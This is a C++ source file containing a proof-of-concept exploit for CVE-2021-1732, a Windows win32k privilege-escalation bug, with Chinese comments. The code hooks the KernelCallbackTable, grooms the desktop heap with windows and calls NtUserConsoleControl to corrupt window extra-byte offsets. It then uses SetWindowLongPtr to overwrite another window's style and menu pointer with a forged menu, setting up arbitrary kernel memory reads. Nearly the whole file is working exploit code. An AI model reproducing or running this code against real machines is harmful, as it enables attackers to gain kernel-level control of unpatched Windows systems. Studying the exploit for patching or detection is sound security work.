#include "include/core/poc.hpp"
using namespace CVE_2021_1732;
namespace offset = exploit::gadget::X_17763_737;
namespace CVE_2021_1732
{

    bool PoC() {

        if (!initAPI())
            return false;

        // 进行hook user!xxxClientAllocWindowClassExtraBytes
        printf("+----------- Setup Hook -------------\n");
        auto pPEB = __readgsqword(0x60);
        auto pKernelCallbackTable = *(PULONG_PTR*)(pPEB + 0x58);
        orign_xxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)pKernelCallbackTable[123];
        printf("[+] Kernel Callback Table at: 0x%p\n[+] user!xxxClientAllocWindowClassExtraBytes at 0x%p\n[+] New MyxxxClientAllocWindowClassExtraBytes: 0x%p\n", pKernelCallbackTable, orign_xxxClientAllocWindowClassExtraBytes, MyxxxClientAllocWindowClassExtraBytes);
        DWORD oldProtect;
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
        pKernelCallbackTable[123] = reinterpret_cast<ULONG_PTR>(MyxxxClientAllocWindowClassExtraBytes);
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, oldProtect, &oldProtect);

        // 注册两种类别的窗口类
        WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"TypeA", nullptr };
        wc.cbSize = sizeof(WNDCLASSEX);
        wc.cbWndExtra = sizeof(LONG_PTR);

        ::RegisterClassExW(&wc);
        wc.lpszClassName = L"TypeB";
        wc.cbWndExtra = magicExtra;
        ::RegisterClassExW(&wc);

        HMENU hMenu = NULL, hHelpMenu = NULL;

        for (size_t i = 0; i < 0x30; i++)
        {
            if (i == 0 || i == 1) { // if is tagWNDK_1, create a menu
                hMenu = CreateMenu();
                hHelpMenu = CreateMenu();

                AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));    // 准备一个 Item
                AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));    // 为菜单添加 Item
            }
            HWND temp = CreateWindowExW(0, L"TypeA", L"wndexp", WS_DISABLED,
                CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
                NULL, hMenu, wc.hInstance, NULL);
            hMenu = NULL;
            g_HWNDs.push_back(temp);
            PVOID tempPVoid = HMValidateHandle(temp, 1);
            g_HWNDKs.push_back(tempPVoid);
        }

        for (size_t i = 2; i < 0x30; i++) {
            DestroyWindow(g_HWNDs[i]);
        }

        // 判断1，2之间的关系
        printf("+----------- set tagWNDK_0 into desktop heap base offset -------------\n");
        printf("[+] tagWNDK_0's HWND: 0x%X, tagWNDK_0's extraFlag: 0x%X\n", g_HWNDs[0], *reinterpret_cast<DWORD*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::dwExtraFlag)));
        ULONG_PTR ChangeOffset = 0;
        ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
        ConsoleCtrlInfo[0] = (ULONG_PTR)g_HWNDs[0]; // 第一个参数需要为窗口句柄
        ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;
        NTSTATUS ret = NtUserConsoleControl(6, reinterpret_cast<ULONG_PTR>(&ConsoleCtrlInfo), sizeof(ConsoleCtrlInfo));
        if (!NT_SUCCESS(ret)) {
            printf("[x] Call NtUserConsoleControl failed\n");
            return false;
        }
        else
            printf("[+] tagWNDK_0's extraFlag: 0x%X, tagWNDK_0's cbWndExtra: 0x%X\n",
                *reinterpret_cast<DWORD*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::dwExtraFlag)),
                *reinterpret_cast<DWORD*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::cbWndExtra))
            );
        tag0_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
        tag1_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[1]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
        tag0_extraByteAddr = *reinterpret_cast<ULONG_PTR*>( // 得到 tagWNDK_0->pExtraByte 便于后续计算偏移
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::pExtraByte));
        printf("[+] tagWNDK_0's pExtraByte: 0x%p, tagWNDK_2's Offset: 0x%p\n", tag0_extraByteAddr, tag1_reverseBaseOffset);
        if (tag0_extraByteAddr > tag1_reverseBaseOffset) {
            printf("[x] Memory layout failed\n");
            return false;
        }


        HWND hwnd2 = CreateWindowExW(0, L"TypeB", L"wndexp",
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
            CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
        g_HWNDKs[2] = HMValidateHandle(hwnd2, 1);
        printf("[+] HWNDs: %X, %X, %X\n", g_HWNDs[0], g_HWNDs[1], choosenOne);
        printf("[+] HWND value: 0x%X, 0x%X\n", choosenOne, hwnd2);
        SetWindowLongPtr(choosenOne, offset::tagWND::tagWNDK::cbWndExtra, 0x0fffffff);
        printf("[+] tagWNDK_0's cbWndExtra: 0x%p\n", *reinterpret_cast<ULONG_PTR*>(
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::cbWndExtra)));

        printf("+----------- setup for arbitry read -------------\n");
        ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_HWNDKs[1] + offset::tagWND::tagWNDK::dwStyle);
        printf("[+] tagWNDK_1's dwStyle| 0x%p: 0x%p, ", g_HWNDKs[1], ululStyle);
        ululStyle |= 0x4000000000000000L; // add WS_CHILD to tagWNDk1.dwStyle

        SetWindowLongPtr(g_HWNDs[0],
            (tag1_reverseBaseOffset - tag0_extraByteAddr) + offset::tagWND::tagWNDK::dwStyle,
            ululStyle);  // modify tagWNDk1.dwStyle

        printf("New dwStyle: 0x%p == 0x%p\n", *(ULONGLONG*)((PBYTE)g_HWNDKs[1] + offset::tagWND::tagWNDK::dwStyle), ululStyle);
        printf("[+] tag0---tag1.dwstyle offset: 0x%p\n", (tag1_reverseBaseOffset - tag0_extraByteAddr) + offset::tagWND::tagWNDK::dwStyle);

        g_fakeMenu = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0xA0);
        *(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x98) = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x20);
        **(ULONG_PTR**)((PBYTE)g_fakeMenu + 0x98) = g_fakeMenu;
        *(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x28) = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x200);
        *(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x58) = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x8); //rgItems 1
        *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x28) + 0x2C) = 1; //cItems 1
        *(DWORD*)((PBYTE)g_fakeMenu + 0x40) = 1;
        *(DWORD*)((PBYTE)g_fakeMenu + 0x44) = 2;
        *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x58)) = 0x4141414141414141;

        //  ULONG_PTR pSPMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)g_pMyMenu);
        ULONG_PTR pSPMenu = SetWindowLongPtr(g_HWNDs[1], GWLP_ID, (LONG_PTR)g_fakeMenu); // change tagWNDK_1->spMenu

        ululStyle &= ~0x4000000000000000L;// recovery dwStyle
        SetWindowLongPtr(g_HWNDs[0],
            (tag1_reverseBaseOffset - tag0_extraByteAddr) + offset::tagWND::tagWNDK::dwStyle,
            ululStyle);  // modify tagWNDk1.dwStyle
        printf("[+] Recovered dwStyle: 0x%p\n", *(ULONGLONG*)((PBYTE)g_HWNDKs[1] + offset::tagWND::tagWNDK::dwStyle));
        printf("[+] tagWNDK_1 pSPMenu a: 0x%p\n", pSPMenu);

        getchar();

        //--------- Recovery Part -------------

        printf("[+] tagWNDK_2 offset to Desktop Heap base: 0x%p == 0x%p\n", *reinterpret_cast<ULONG_PTR*>( //need repair after exploit
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[2]) + offset::tagWND::tagWNDK::pExtraByte)), tag0_extraByteAddr);
        getchar();

        SetWindowLongPtr(g_HWNDs[0], tag2_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::pExtraByte, tag2_reverseBaseOffset);
        printf("[+] tagWNDK_2 offset to Desktop Heap base: 0x%p == 0x%p\n", *reinterpret_cast<ULONG_PTR*>( //need repair after exploit
            (reinterpret_cast<ULONG_PTR>(g_HWNDKs[2]) + offset::tagWND::tagWNDK::pExtraByte)), 0);


        //--------- HWND research Part -------------

        // HWND hwnd;

        // hwnd = CreateWindowExW(0, L"TypeA", L"wndexp",
        //     CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        //     CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
        // printf("HWND value: 0x%x\n", hwnd);
        // getchar();
        // int a = 0xDEADBEEF;
        // SetWindowLong(hwnd, 0, a);
        // printf("[+] Write in: 0x%x\n", hwnd, a);
        // getchar();
        // LONG_PTR retrievedValue = GetWindowLong(hwnd, 0);
        // printf("[+] Read with: 0x%x\n", retrievedValue);
        // getchar();

        return true;
    }


} // namespace CVE_2021_1732